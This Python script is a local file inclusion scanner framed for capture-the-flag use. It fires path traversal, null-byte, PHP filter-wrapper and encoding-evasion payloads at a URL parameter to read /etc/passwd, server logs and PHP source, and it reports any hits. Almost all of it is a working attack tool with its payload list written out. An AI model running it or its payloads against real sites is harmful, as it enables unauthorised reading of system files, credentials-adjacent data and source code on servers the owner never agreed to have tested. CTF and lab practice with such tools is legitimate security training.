#!/usr/bin/env python3
"""
lfi_scanner.py - CTF Local File Inclusion Scanner

Automates testing LFI vulnerabilities by injecting various path traversal
and wrapper payloads into URL parameters.
"""

import argparse
import sys
import requests
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning

# Suppress insecure request warnings for HTTPS without valid certs
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ANSI colors
class C:
    RED     = '\033[91m'
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    CYAN    = '\033[96m'
    BOLD    = '\033[1m'
    DIM     = '\033[2m'
    RESET   = '\033[0m'

# Common LFI targets
LINUX_TARGETS = [
    '/etc/passwd',
    '/etc/hosts',
    '/etc/issue',
    '/var/log/apache2/access.log',
    '/var/log/nginx/access.log'
]

# Success indicators in response
SUCCESS_PATTERNS = {
    '/etc/passwd': ['root:x:0:0:', 'daemon:x:1:1:', 'www-data:x:'],
    '/etc/hosts': ['127.0.0.1', 'localhost'],
    '/etc/issue': ['Ubuntu', 'Debian', 'Linux'],
    'access.log': ['GET /', 'HTTP/1.1']
}

# Payloads templates where {file} will be replaced by the target
LFI_PAYLOADS = [
    # Direct
    '{file}',
    
    # Simple traversal (up to 8 levels deep)
    '../{file}',
    '../../{file}',
    '../../../{file}',
    '../../../../{file}',
    '../../../../../{file}',
    '../../../../../../{file}',
    '../../../../../../../{file}',
    '../../../../../../../../{file}',
    
    # Nullbyte injection
    '../../../../../../../../{file}%00',
    '../../../../../../../../{file}\x00',
    
    # PHP Wrappers
    'php://filter/convert.base64-encode/resource={file}',
    'php://filter/read=convert.base64-encode/resource={file}',
    
    # Filter bypass (stripping `../`)
    '....//....//....//....//....//....//....//....//{file}',
    '..././..././..././..././..././..././..././..././{file}',
    
    # URL Encoding
    '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{file}',  # ../../
    '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{file}',              # Double encoded
    
    # WAF Evasion / Special encodings
    '..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{file}',
    '..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c{file}',
]


def check_flag(text):
    if 'flag{' in text.lower() or 'ctf{' in text.lower():
        return True
    return False

def test_payload(url, param, payload, target, method='GET', cookies=None, headers=None, session=None):
    """Test a single payload and target combination."""
    if not session:
        session = requests.Session()
        
    # Replace target in payload
    final_payload = payload.replace('{file}', target if not target.startswith('/') else target[1:])
    # Also try absolute path version for direct hits
    absolute_payload = payload.replace('{file}', target)
    
    urls_to_test = []
    
    if method == 'GET':
        # Replace the literal 'INJECT' or attach to the param
        if 'INJECT' in url:
            urls_to_test.append(url.replace('INJECT', final_payload))
            if absolute_payload != final_payload:
                urls_to_test.append(url.replace('INJECT', absolute_payload))
        else:
            # Parse URL and replace the specific query param
            try:
                parsed = urllib.parse.urlparse(url)
                query = urllib.parse.parse_qs(parsed.query)
                query[param] = [final_payload]
                new_query = urllib.parse.urlencode(query, doseq=True)
                urls_to_test.append(urllib.parse.urlunparse(parsed._replace(query=new_query)))
                
                if absolute_payload != final_payload:
                    query[param] = [absolute_payload]
                    new_query = urllib.parse.urlencode(query, doseq=True)
                    urls_to_test.append(urllib.parse.urlunparse(parsed._replace(query=new_query)))
            except Exception:
                pass
                
    for test_url in urls_to_test:
        try:
            req_headers = headers.copy() if headers else {}
            req_headers.setdefault('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0')
            
            res = session.get(test_url, cookies=cookies, headers=req_headers, verify=False, timeout=5)
            text = res.text
            
            # Check for base64 encoded results from PHP wrappers
            decoded_text = ''
            if 'base64-encode' in final_payload:
                import base64
                # Simplistic base64 extraction – find long base64 chunks
                import re
                chunks = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', text)
                for chunk in chunks:
                    try:
                        dec = base64.b64decode(chunk).decode('utf-8')
                        decoded_text += dec + '\n'
                    except:
                        pass
                text_to_check = decoded_text + text # check both
            else:
                text_to_check = text
                
            # Check for success indicators
            for pattern in SUCCESS_PATTERNS.get(target, []):
                if pattern in text_to_check:
                    return True, test_url, "Match: " + pattern, text_to_check
                    
            if check_flag(text_to_check):
                return True, test_url, "Flag found!", text_to_check
                
            # If requesting index.php via filter and it contains PHP tags
            if target == 'index.php' and ('<?php' in text_to_check or '<?=' in text_to_check):
                return True, test_url, "PHP Source code retrieved", text_to_check
                
        except requests.RequestException:
            pass
            
    return False, None, None, None


def main():
    parser = argparse.ArgumentParser(
        description='CTF Local File Inclusion Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s 'http://target.com/index.php?page=INJECT'
  %(prog)s 'http://target.com/view' --param file
  %(prog)s 'http://target.com/?page=INJECT' -t 'flag.txt'
""")
    
    parser.add_argument('url', help="Target URL. Put 'INJECT' where payload goes, or use --param")
    parser.add_argument('-p', '--param', help='URL parameter to inject (if not using INJECT in URL)')
    parser.add_argument('-t', '--target', help='Specific file to target (default: /etc/passwd)', 
                        default='/etc/passwd')
    parser.add_argument('--php', action='store_true', help='Target index.php to dump source code via wrappers')
    parser.add_argument('-c', '--cookie', help='Cookies (e.g. session=123; user=admin)')
    parser.add_argument('--threads', type=int, default=5, help='Number of concurrent threads (default: 5)')

    args = parser.parse_args()
    
    if 'INJECT' not in args.url and not args.param:
        print(f"{C.RED}Error: Must specify 'INJECT' in the URL or provide --param.{C.RESET}")
        sys.exit(1)

    print(f"\n{C.CYAN}{C.BOLD}{'─' * 60}\n  LFI Scanner\n{'─' * 60}{C.RESET}")
    print(f"  Target URL: {args.url}")
    target_files = [args.target]
    if args.php:
        target_files.append('index.php')
        
    print(f"  Target files: {', '.join(target_files)}")
    print(f"  {C.YELLOW}⟳ Scanning {len(LFI_PAYLOADS) * len(target_files)} payloads...{C.RESET}\n")

    cookies = {}
    if args.cookie:
        for c in args.cookie.split(';'):
            if '=' in c:
                k, v = c.strip().split('=', 1)
                cookies[k] = v

    session = requests.Session()
    
    tasks = []
    for tgt in target_files:
        for payload in LFI_PAYLOADS:
            tasks.append((args.url, args.param, payload, tgt))
            
    found_vuln = False
            
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for task in tasks:
            futures.append(executor.submit(test_payload, *task, 'GET', cookies, None, session))
            
        for future in futures:
            success, hit_url, reason, resp_text = future.result()
            if success:
                found_vuln = True
                print(f"  {C.GREEN}{C.BOLD}★ VULNERABILITY FOUND! ★{C.RESET}")
                print(f"  {C.CYAN}URL:{C.RESET}    {hit_url}")
                print(f"  {C.DIM}Reason:{C.RESET} {reason}\n")
                
                if check_flag(resp_text):
                    print(f"  {C.RED}{C.BOLD}⚑ FLAG DETECTED IN RESPONSE!{C.RESET}\n")
                
                # Show excerpt
                lines = [line for line in resp_text.splitlines() if line.strip()]
                excerpt = '\n    '.join(lines[:15])
                print(f"  {C.DIM}Response Excerpt:{C.RESET}\n    {excerpt}")
                if len(lines) > 15:
                    print(f"    {C.DIM}... (truncated, {len(lines)} lines total){C.RESET}")
                
                print(f"\n  {C.YELLOW}Stopping on first success to prevent spam.{C.RESET}\n")
                
                # Important: In a real tool we might want to continue, 
                # but for CTF scripts stopping aggressively on flag/success is preferred.
                executor.shutdown(wait=False, cancel_futures=True)
                break

    if not found_vuln:
        print(f"  {C.RED}✗ No LFI vulnerabilities detected.{C.RESET}\n")

if __name__ == '__main__':
    main()
